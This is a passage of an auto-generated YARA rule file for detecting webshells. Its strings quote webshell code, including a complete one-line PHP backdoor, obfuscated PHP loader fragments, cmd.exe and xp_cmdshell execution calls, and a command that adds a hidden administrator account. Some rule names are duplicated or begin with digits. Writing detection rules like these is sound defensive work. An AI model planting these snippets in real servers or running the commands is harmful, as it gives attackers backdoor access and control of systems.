      $x16 = "Set matchColl=regex.Execute(tempFileData)" fullword ascii
      $x17 = "conn.execute(\"EXEC master..xp_cmdshell 'echo \"&substrfrm&\" >>c:\\tmp.fmt'\")" fullword ascii
      $x18 = "conn.execute(\"EXECUTE master..xp_cmdshell 'del c:\\tmp.fmt'\")" fullword ascii
      $x19 = "ADSstr=ADSstr&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
      $x20 = "User,suPass,suPort,suPath,suCmd,deldomain,newdomain,newuser,suquit,loginuser,loginpass,mt,targetUrl,ipList,portList,dicList,outP" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*)
}

rule NEW_WebShell__1___2014_10_23_14_54_16 {
   meta:
      description = "webshell - file NEW WebShell (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
   strings:
      $s1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s2 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s3 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s4 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s5 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s6 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s7 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s8 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s9 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
      $s10 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s11 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s12 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s13 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(Replace(replace(thePath,server.MapPath(" ascii
      $s14 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s15 = "<a href='javascript:ShowFolder(\"\"D:\\\\RECYCLER\\\\\"\")'>D:\\RECYCLER</a>" fullword ascii
      $s16 = "    Conn.Execute(SqlStr)" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
      $s18 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
      $s19 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s20 = "raelc.rre" fullword ascii /* reversed goodware string 'err.clear' */
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule NEW_WebShell {
   meta:
      description = "webshell - file NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s2 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s3 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s4 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s5 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s6 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s7 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s8 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s9 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
      $s10 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s11 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s12 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s13 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(Replace(replace(thePath,server.MapPath(" ascii
      $s14 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s15 = "<a href='javascript:ShowFolder(\"\"D:\\\\RECYCLER\\\\\"\")'>D:\\RECYCLER</a>" fullword ascii
      $s16 = "    Conn.Execute(SqlStr)" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
      $s18 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
      $s19 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s20 = "raelc.rre" fullword ascii /* reversed goodware string 'err.clear' */
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_netspy {
   meta:
      description = "webshell - file netspy.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c363b86ed9622b529f7b7e3bd10e05c30738dee595038400cdab9cd9033bad6"
   strings:
      $s1 = " System.out.println(\"getHostPort:\"+task);" fullword ascii
      $s2 = "System.out.println(\"getHtmlContext:\" + e.getMessage());" fullword ascii
      $s3 = "System.out.println(\"getCss:\" + e.getMessage());" fullword ascii
      $s4 = "System.out.println(\"end:\" + end);" fullword ascii
      $s5 = "System.out.println(\"start:\" + start);" fullword ascii
      $s6 = "System.out.println(\"getHtmlContext2:\" + e.getMessage());" fullword ascii
      $s7 = "String scantarget = useIp + i + \":\" + port[j];" fullword ascii
      $s8 = "//System.out.println(scantarget);" fullword ascii
      $s9 = "conn.addRequestProperty(\"User-Agent\"," fullword ascii
      $s10 = "String s = application.getRealPath(\"/\") + \"/port.txt\";" fullword ascii
      $s11 = "queue.offer(scantarget);" fullword ascii
      $s12 = "System.out.print(e.getMessage());" fullword ascii
      $s13 = "\" + cpath+\"/port.txt" fullword ascii
      $s14 = "String reaplce = \"href=\\\"http://127.0.0.1:8080/Jwebinfo/out.jsp?url=\";" fullword ascii
      $s15 = "System.out.print(post);" fullword ascii
      $s16 = "+ getHtmlContext(getHTTPConn(cssuuu), decode,false)" fullword ascii
      $s17 = "boolean getHostPort(String task){" fullword ascii
      $s18 = "http.getOutputStream(), decode);" fullword ascii
      $s19 = "FileUtils.writeStringToFile(new File(cpath+\"/port.txt\"), s,\"UTF-8\",true);" fullword ascii
      $s20 = "System.out.print(e.getLocalizedMessage());" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule 2014 {
   meta:
      description = "webshell - file 2014.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
      $s3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s4 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s5 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s6 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
      $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
      $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
      $s9 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s10 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s14 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s15 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s16 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
      $s17 = "j cdx&\"<a href='http://www.7jyewu.cn/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
      $s18 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s19 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s20 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
   condition:
      uint16(0) == 0x6f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule 2013 {
   meta:
      description = "webshell - file 2013.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
      $s3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s4 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s5 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s6 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
      $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
      $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
      $s9 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s10 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s14 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s15 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s16 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
      $s17 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s18 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s19 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
      $s20 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
   condition:
      uint16(0) == 0x6f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule shell_decoded {
   meta:
      description = "webshell - file shell_decoded.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
   strings:
      $x1 = "returnContent = server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&command).stdout.readall" fullword ascii
      $x2 = "set rS=adoCon.Execute(command, intAffected)" fullword ascii
      $x3 = "'myInfo.add \"msgResponse\", \"SQL Command Execute Successful !\"" fullword ascii
      $s4 = "FSO.CopyFolder itemPath, targetPath, true" fullword ascii
      $s5 = "FSO.MoveFolder itemPath, targetPath" fullword ascii
      $s6 = "objNetwork.MapNetworkDrive driverLetter & \":\", remoteShare, True, userName, password" fullword ascii
      $s7 = "FSO.MoveFile itemPath,targetPath" fullword ascii
      $s8 = "FSO.CopyFile itemPath, targetPath, true" fullword ascii
      $s9 = "Response.Write \"<TR><TD align='center'><b>Command : </b><input style='color=#DAFDD0' name=\"\"vcommand\"\" id=\"\"vcommand\"\" " ascii
      $s10 = "Dim objNetwork, myInfo, driverLetter, remoteShare, userName, password" fullword ascii
      $s11 = "Dim myInfo, targetPath, foldersId, filesId, ndir, nfile, dir, file, itemName, itemPath, gMsg" fullword ascii
      $s12 = "myInfo.add \"errorDesc\", Err.Description" fullword ascii
      $s13 = "Response.Write \"<TD><input style='color=#DAFDD0' name=\"\"sqlcommand\"\" id=\"\"sqlcommand\"\" size='100' value='SELECT TOP 100" ascii
      $s14 = "vascript:showMode('Explorer', true);\"\"><b>* Home *</B> </a> | <a href=\"\"#SQL\"\"><b>* SQL *</b></a> | <a href='#CMD'><b>* CM" ascii
      $s15 = "Response.Write \"<TD><input style='color=#DAFDD0' name=\"\"sqlcommand\"\" id=\"\"sqlcommand\"\" size='100' value='SELECT TOP 100" ascii
      $s16 = "Response.Write \"<form onSubmit=\"\"runCMD();return false;\"\" method=\"\"post\"\">\"" fullword ascii
      $s17 = "Uploader.Upload()" fullword ascii
      $s18 = "Response.Write \"<table cellpadding=\"\"0\"\" cellspacing=\"\"0\"\" height=\"\"25\"\"><tr><td class=\"\"kbrtm1\"\">&nbsp;&nbsp;&" ascii
      $s19 = "Response.Write \"<TD valign='top'><b>SQL Command : </b></TD><TD valign='top'><input type=\"\"button\"\" id=\"\"commandChange\"\"" ascii
      $s20 = "Response.Write \"<TD valign='top'><b>SQL Command : </b></TD><TD valign='top'><input type=\"\"button\"\" id=\"\"commandChange\"\"" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_wso {
   meta:
      description = "webshell - file wso.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
   strings:
      $x1 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
      $x2 = "      Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
      $x3 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x4 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x5 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x6 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
      $x8 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
      $x9 = "response.Write(\"<script>alert('File \" & filename & \" upload success!\\nFile info:\\n\\nClient Path:\" & replace(UpFile.value," ascii
      $x10 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $s11 = "ExecuteCommand2(command,tempFile)" fullword ascii
      $s12 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
      $s13 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
      $s14 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
      $s15 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
      $s16 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
      $s17 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $s18 = "  <p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $s19 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $s20 = "    <td><a href=\"?action=user\" >List User Accounts</a> - <a href=\"?action=auser\" >IIS Anonymous User</a>- <a href=\"?action=" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule aspxwdir {
   meta:
      description = "webshell - file aspxwdir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7df428111122df64bb26934fd4b67d41ae62489a497a759909418a4a647ef463"
   strings:
      $s1 = "Server.ScriptTimeOut=999999999" fullword ascii
      $s2 = "<script type=\"text/javascript\" src=\"http://web.nba1001.net:8888/tj/tongji.js\"></script>" fullword ascii
      $s3 = "    Fso.DeleteFile(DirStr&\"\\temp.tmp\")" fullword ascii
      $s4 = "    Fso.CreateTextFile(DirStr&\"\\temp.tmp\")" fullword ascii
      $s5 = "ShowPath=\"C:\\Program Files\\\"" fullword ascii
      $s6 = "<form name=\"form1\" method=\"post\" action=\"\">" fullword ascii
      $s7 = "response.write \"&nbsp;\"" fullword ascii
      $s8 = "Set Fso=server.createobject(\"scr\"&\"ipt\"&\"ing\"&\".\"&\"fil\"&\"esy\"&\"ste\"&\"mob\"&\"jec\"&\"t\") " fullword ascii
      $s9 = "ShowPath=sPath" fullword ascii
      $s10 = "</b></font>\"" fullword ascii
      $s11 = "ShowPath=\"\"" fullword ascii
      $s12 = "'Response.Buffer = FALSE" fullword ascii
      $s13 = "Function CheckDirIsOKDel(DirStr)" fullword ascii
      $s14 = "Set Fso=nothing" fullword ascii
      $s15 = "Function Bianli(path)" fullword ascii
      $s16 = "    Set Objfolder=fso.getfolder(path)" fullword ascii
      $s17 = "if sPath<>\"\" then" fullword ascii
      $s18 = "  <label>  </label>" fullword ascii
      $s19 = "if sPath=\"\" then" fullword ascii
      $s20 = "Function WriteSpace(NunStr)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 7KB and
      8 of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "df74afc2af90dc93ede0bf5cd6ef4b1f836de65d97c055593088dc30f5115315"
   strings:
      $s1 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s2 = "Mail: chinese@hackermail.com" fullword ascii
      $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s4 = "ILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"post\" " ascii
      $s5 = "Site: http://blog.weili.me" fullword ascii
      $s6 = "---------------------------->" fullword ascii
      $s7 = "part/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>" fullword ascii
      $s8 = "<!--------------------------" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13466ff956ee60d8d47b7521653bf5cb69226b0abf06f7ae59bbaa0b14302036"
   strings:
      $s1 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword ascii
      $s2 = ":expdoor" fullword ascii
      $s3 = "---------------------------->" fullword ascii
      $s4 = "<!--------------------------" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule webshell_php_tk {
   meta:
      description = "webshell - file tk.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "14825de459e863ef46c526f1791c8e9ac4bd49aaaf3683413a03f1e74574e7af"
   strings:
      $s1 = "$D='y(iS\"/\",iS\"iS+\")iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d';" fullword ascii
      $s2 = "$Q='=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(\"iS<$k>iS$d</iS$k>\");@siSessioniS_destroyiS();}}}}';" fullword ascii
      $s3 = "$W='_key_exiSists(iS$i,$s)){iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e){$k=$kh.$kiSf;ob_stiSiS';" fullword ascii
      $s4 = "$h='ll(iS\"/([\\\\w])iS[\\\\w-]+(iS?:;q=0.iS([iSiS\\\\d]))?,?/\",iS$riSa,iS$miS);if($q&&$m){@session_staiSrtiS(iS);$';" fullword ascii
      $s5 = "$p='ERViSEiSR;iS$rr=@$r[\"HTTiSP_REFEiSRER\"iS];$ra=@$r[iS\"iSHTTP_ACCEiSPT_LANGiSUAGE\"]iS;ifiS($rr&&$iSra){$';" fullword ascii
      $s6 = "$Z='art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(\"/_/\",\"/-/iS\"),arriSa';" fullword ascii
      $s7 = "$L=str_replace('x','','crexxatex_fxxunxction');" fullword ascii
      $s8 = "$l='$kh=\"3481\"iS;iS$kf=\"iS9diS7b\";funiSctiSion x($t,$k){$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=\"\";foiSr(iS$i=0iS';" fullword ascii
      $s9 = "$O=str_replace('iS','',$l.$E.$p.$g.$h.$H.$X.$u.$W.$Z.$D.$Q);" fullword ascii
      $s10 = "$H='s=&iS$_SESSiSION;$ss=\"subsiSiStr\";$sliS=\"stiSrtolower\";$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS';" fullword ascii
      $s11 = "$X='($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=\"\";foriS($z=1;$z<couiSiSnt($m[1]);$z+i';" fullword ascii
      $s12 = "$u='S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS){$s[$iiS]=iS\"\";$iSpiS=$ss($p,3);}if(arriSiSay';" fullword ascii
      $s13 = "$g='u=paiSrse_iSiSurl($rr);pariSse_siStr($u[\"queriSy\"],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a';" fullword ascii
      $s14 = "$E=';$i<$l;){foriS($j=0;(iS$j<$ciS&&iS$i<$l);$jiSiS++,iS$i++){$o.=$t{$iiS}^$k{$j}iS;iS}iS}riSeturn $o;}$r=$_S';" fullword ascii
      $s15 = "$q=$L('',$O);$q();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule webshell_asp_EFSO_2 {
   meta:
      description = "webshell - file EFSO_2.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
   strings:
      $s1 = "karsa EJDER & SaVSAK.CoM Sorunlu de" fullword ascii
      $s2 = "wZAAvPkky" fullword ascii /* base64 encoded string 'd />I2' */
      $s3 = "r for SaVSaK.CoM . T" fullword ascii
      $s4 = ".rD+~J@!&DN@*@!zDD@*@!zDC4^+@*J@#@&UG^k/D~',KD!n@#@&b0,+.D@!@*+ ~Y4nx,CCOm@#@&rW,+.DcU!:8" fullword ascii
      $s5 = "m Fastboy a Aittir. -->" fullword ascii
      $s6 = "S~ER -c -cRwv,PXC\"" fullword ascii
      $s7 = "[O1WVK.lbz!Z!TJE@*@!0GxD~/bynxFP0C^" fullword ascii
      $s8 = "D-r1+RaANr~Jr'sW1l^[E-  '\\Ok|2\\DzdnM\\k^ncwANrSrJ'^W1lVLJ' R'R -7Yrma\\YJd+M\\k1n wSNr~EJ'sKmCVLE-cRw c-R w7Yr{a-Dzd" fullword ascii
      $s9 = "nCY4[E_0Wx!h'r[VK^CVLJ'R -  '[4l1V+9'C[skx 2SN'Kbh" fullword ascii
      $s10 = "WGR4YsVE~EELVGmms[r-  'RRwm7Yr{a-D-2K/Dkx6Wc4YsVE~rJ'sKml^'J'RR'  -cR'{-Yrma\\O-aG/DkUWKRtOh^JSJr'^W^mVLJ-7Ybmw7Y&/" fullword ascii
      $s11 = ")hk[[^+IP4nkTtOl8%i~8KD[+MR^+WD)8w6,/Ksk9P:FyF+qyiP(GD9+D .ro4Y=F26~dKVrN,:*9*[X9iP8GMNnD 8KYOK:=FwXPkGVbN~alNX[lNi,8WMN+MROWa)8" ascii
      $s12 = "'JrhE^YkaC.YJ0KDhO[CDlEJ,CmDkGU{BJ'obVnnmO4[EQ:KN+{ l'Kb:n'r[Ors+[r'nmYt{E'3Kx!:'Jv~&fxJroWM:qEr@*J@#@&M+dwKUk+ SDbY+,J@!rxaEOPD" ascii
      $s13 = "/n qDkDnPr@!Y9@*@!0KxDP^WsGM'8Vm^3@*@!8@*Lx4d2p[U4k2p[U(/aiJLW(%I1/ sb+s[k`k* 1m:+LE'x(/ai'x8dai'x(dwp@!&WKxY@*@!JY[@*r@#@&d7ix" fullword ascii
      $s14 = "DbYDnx,4zPA993\"P0K.PUl.UCFR;Wt@!&4@*E*@#@&@#@&@#@&A19~U2S3/:@#@&@#@&@#@&kW,wKwEaP{~smVd+,bH9,xW^r/DP',oCVk+,Y4+U@#@&Dn/aGxk+ AM" ascii
      $s15 = "'JrhE^YkaC.YJ0KDhO[CDlEJ,CmDkGU{BJ'obVnnmO4[EQ:KN+{ l'Kb:n'r[Ors+[r'nmYt{E'3Kx!:'Jv~&fxJroWM:qEr@*J@#@&M+dwKUk+ SDbY+,J@!rxaEOPD" ascii
      $s16 = "DbYDnx,4zPA993\"P0K.PUl.UCFR;Wt@!&4@*E*@#@&@#@&@#@&A19~U2S3/:@#@&@#@&@#@&kW,wKwEaP{~smVd+,bH9,xW^r/DP',oCVk+,Y4+U@#@&Dn/aGxk+ AM" ascii
